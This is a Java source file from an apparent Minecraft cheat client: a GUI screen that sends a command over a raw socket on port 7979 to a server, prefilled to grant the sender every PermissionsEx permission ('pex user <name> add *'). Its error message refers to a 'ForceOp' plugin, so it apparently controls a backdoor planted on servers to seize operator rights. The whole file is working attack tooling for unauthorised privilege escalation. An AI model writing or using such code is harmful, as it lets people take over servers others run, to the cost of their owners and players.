package me.bratwurst.guiMain;

import me.bratwurst.news.proxy.ProxyMenuScreen;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiTextField;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.util.EnumChatFormatting;
import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.GL11;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Proxy;
import java.net.Socket;

public class GuiPex extends GuiScreen{
    public static Proxy currentProxy = null;
    public static boolean useProxy = false;
    static GuiTextField ip;
    static GuiTextField cmd;
    static GuiScreen before;
    private static boolean isRunning;
    private GuiButton button;
    private String status;
    public static String renderText;

    public GuiPex(GuiScreen before) {
        GuiForceOp.before = before;
    }

    @Override
    protected void actionPerformed(GuiButton button) {
        switch (button.id){
            case 1:
                this.mc.displayGuiScreen(before);
                break;

            case 2:
                try {
                    //   System.out.println(ip.getText());
                    Socket clientSocket = new Socket(ip.getText(), 7979);
                    PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);

                    out.println(cmd.getText());
                    clientSocket.close();
                } catch (IOException e) {
                    PlayerUtils.sendMessage(EnumChatFormatting.DARK_GRAY + "Das ForceOp Plugin ist nicht auf dem Server!");
                }
                break;

        }
    }



    @Override
    public void drawScreen(int x, int y, float z) {
        new ScaledResolution(this.mc);
        this.drawDefaultBackground();
        GL11.glPushMatrix();
        GL11.glColor4d((double)1.0, (double)1.0, (double)1.0, (double)1.0);
        GL11.glScaled((double)4.0, (double)4.0, (double)4.0);
        ProxyMenuScreen.drawCenteredString(this.mc.fontRendererObj, renderText, this.width / 8, this.height / 4 - this.mc.fontRendererObj.FONT_HEIGHT, 0);
        GL11.glPopMatrix();
        ProxyMenuScreen.drawCenteredString(this.mc.fontRendererObj, this.status, this.width / 2, 20, -1);
        ip.drawTextBox();
        cmd.drawTextBox();
        ProxyMenuScreen.drawCenteredString(this.mc.fontRendererObj, "\u00a77IP", this.width / 2, 50, -1);
        super.drawScreen(x, y, z);
    }

    @Override
    public void initGui() {
        renderText = "";
        this.buttonList.add(new GuiButton(1, this.width / 2 - 100, this.height / 3 + 90, 200, 20, "Back"));
        this.buttonList.add(new GuiButton(2, this.width / 2 - 100, this.height / 3 + 66, 200, 20, "Send"));
        ip = new GuiTextField(this.height, this.mc.fontRendererObj, this.width / 2 - 100, 60, 200, 20);
        cmd = new GuiTextField(this.height, this.mc.fontRendererObj, this.width / 2 - 100, 84, 200, 20);
        ip.setMaxStringLength(100);
        cmd.setMaxStringLength(100);
        ip.setText("Gib Eine Ip ein");
        cmd.setText("pex user " + Minecraft.getMinecraft().session.getUsername() + " add *");
        this.status = "\u00a76Gib Jemanden Pex *";
        ip.setFocused(false);
        cmd.setFocused(true);
        Keyboard.enableRepeatEvents((boolean)true);
    }

    @Override
    protected void keyTyped(char character, int key) {
        try {
            super.keyTyped(character, key);
        }
        catch (IOException var4) {
            var4.printStackTrace();
        }
        if (character == '\r') {
            this.actionPerformed((GuiButton)this.buttonList.get(0));
        }
        ip.textboxKeyTyped(character, key);

    }

    @Override
    protected void mouseClicked(int x, int y, int button) {
        try {
            super.mouseClicked(x, y, button);
        }
        catch (IOException var5) {
            var5.printStackTrace();
        }
        ip.mouseClicked(x, y, button);

    }

    @Override
    public void onGuiClosed() {
        Keyboard.enableRepeatEvents((boolean)false);
    }

    @Override
    public void updateScreen() {
        ip.updateCursorCounter();
        cmd.updateCursorCounter();
    }

    static {
        renderText = "";
    }

}
